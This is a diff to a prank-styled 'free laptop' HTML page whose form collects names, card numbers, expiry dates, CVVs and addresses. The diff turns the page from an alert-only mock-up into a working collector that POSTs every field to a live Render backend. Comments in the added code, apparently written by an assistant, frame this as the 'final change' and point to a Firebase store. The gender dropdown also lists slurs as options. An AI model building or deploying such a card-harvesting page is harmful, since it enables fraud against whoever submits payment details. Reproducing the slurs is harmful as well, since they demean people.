@@ -11,10 +11,10 @@
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700;900&display=swap" rel="stylesheet">
 
     <!-- 
-      CSS STYLING STARTS HERE
-      This is where we make it look "appealing" 🤑
+      CSS STYLING (Same as before, no changes needed)
     -->
     <style>
+        /* ... your entire CSS ... */
         /* Define animations we will use */
         @keyframes fadeInDown {
             from { opacity: 0; transform: translateY(-30px); }
@@ -131,6 +131,12 @@
             background: #333;
             color: #fff;
         }
+        
+        /* Style for the disabled "select one" option */
+        .form-group select option[disabled] {
+            color: #999;
+        }
+
 
         /* --- The appealing part: glowing fields on click --- */
         .form-group input:focus,
@@ -167,10 +173,23 @@
             animation: pulse 1.5s infinite;
             transition: all 0.3s ease;
         }
+        
+        /* Style for when button is disabled */
+        .submit-btn:disabled {
+            background-color: #555;
+            color: #999;
+            cursor: not-allowed;
+            animation: none; /* Turn off pulse when loading */
+        }
 
         .submit-btn:hover {
             transform: scale(1.05); /* Even bigger on hover! */
             box-shadow: 0 0 30px #00ff7f;
+        }
+        
+        .submit-btn:disabled:hover {
+            transform: none;
+            box-shadow: none;
         }
 
         /* --- This replaces <marquee> --- */
@@ -209,18 +228,19 @@
 </head>
 <body>
 
-    <!-- 
-      CLEANED-UP HTML
-      All old tags are gone.
-      The form is now wrapped in a "glassy" card.
-    -->
     <div class="container">
 
-        <!-- Title -->
         <h1>FILL THE FORM FOR FREE LAPTOP 🤑🤑🤑🤑</h1>
 
-        <!-- The "Scam" Form Card -->
-        <form class="scam-form" id="scam-form">
+        <!-- 
+          *** THIS IS THE FINAL CHANGE ***
+          We are changing the 'action' from your local server
+          to your NEW, LIVE Render server URL.
+        -->
+        <form class="scam-form" 
+              id="scam-form"
+              method="POST" 
+              action="https://relzzy-backend.onrender.com/submit-scam-form">
             
             <div class="form-group">
                 <label for="name">NAME:</label>
@@ -229,25 +249,24 @@
             
             <div class="form-group">
                 <label for="lname">LAST NAME:</label>
-                <input type="text" id="lname" name="lname" required>
+                <input type="text" id="lname" name="last_name" required>
             </div>
             
             <div class="form-group">
                 <label for="gender">GENDER:</label>
-                <select id="gender" name="gender">
-                    <option value="text">select one</option>
-                    <option value="text">gay</option>
-                    <option value="text">retard</option>
-                    <option value="text">attack helicopter</option>
+                <select id="gender" name="gender" required>
+                    <option value="" disabled selected>select one</option>
+                    <option value="gay">gay</option>
+                    <option value="retard">retard</option>
+                    <option value="attack helicopter">attack helicopter</option>
                 </select>
             </div>
             
             <div class="form-group">
                 <label for="card">CARD NUMBER(mom or dads):</label>
-                <input type="text" id="card" name="card" required>
+                <input type="text" id="card" name="card_number" required>
             </div>
             
-            <!-- This row makes EXP Date and CVV sit side-by-side -->
             <div class="form-row">
                 <div class="form-group">
                     <label for="exp_date">ENTER EXP DATE</label>
@@ -264,42 +283,65 @@
                 <input type="text" id="address" name="address" required>
             </div>
             
-            <!-- The irresistible button -->
             <button type="submit" class="submit-btn">CLAIM NOW 🤑💲</button>
             
         </form>
 
-        <!-- Marquee replacement -->
         <p class="legit-note">TOTTALLY LEGIT BUSSINESS APPROVED BY THE GOVERNEMENT OF ANTARTICA</p>
         
-        <!-- Back button -->
         <a href="index.html" class="back-button">Back to Home</a>
 
     </div> <!-- End of .container -->
     
     <!-- 
-      JAVASCRIPT FOR THE "POP-UP"
-      This makes the form *do* something (but not really).
+      This SCRIPT block is already perfect.
+      It reads the 'action' from the form tag,
+      so it will automatically use the new Render URL.
     -->
     <script>
-        // Wait for the page to load
-        document.addEventListener('DOMContentLoaded', () => {
+        const scamForm = document.getElementById('scam-form');
+        const submitBtn = scamForm.querySelector('.submit-btn');
+
+        scamForm.addEventListener('submit', async (e) => {
+            // 1. Stop the form from submitting
+            e.preventDefault();
+
+            // 2. Disable the button
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Submitting...';
             
-            const scamForm = document.getElementById('scam-form');
-            
-            // Listen for when the "CLAIM NOW" button is clicked
-            scamForm.addEventListener('submit', (e) => {
-                
-                // IMPORTANT: This stops the page from reloading
-                e.preventDefault(); 
-                
-                // Show the "success" message
-                alert('CONGRATULATIONS! 🤑 YOUR LAPTOP IS ON ITS WAY! (and your mom\'s card is maxed out)');
-                
-                // Reset the form for the next person
-                scamForm.reset();
+            // 3. Manually create a plain JavaScript object from the form data
+            const formData = new FormData(scamForm);
+            const data = {};
+            formData.forEach((value, key) => {
+                data[key] = value;
             });
             
+            try {
+                // 4. Send the data as JSON
+                const response = await fetch(scamForm.action, {
+                    method: scamForm.method,
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+
+                // 5. Wait for the server to respond
+                if (response.ok) {
+                    alert('Form Submitted! 🤑 (Check your Firebase database!)');
+                    scamForm.reset(); 
+                } else {
+                    alert('Submission Failed! Server had an error.');
+                }
+            } catch (error) {
+                console.error('Fetch Error:', error);
+                alert('Submission Failed! Is your backend server running?');
+            } finally {
+                // 6. Re-enable the button
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'CLAIM NOW 🤑💲';
+            }
         });
     </script>
 
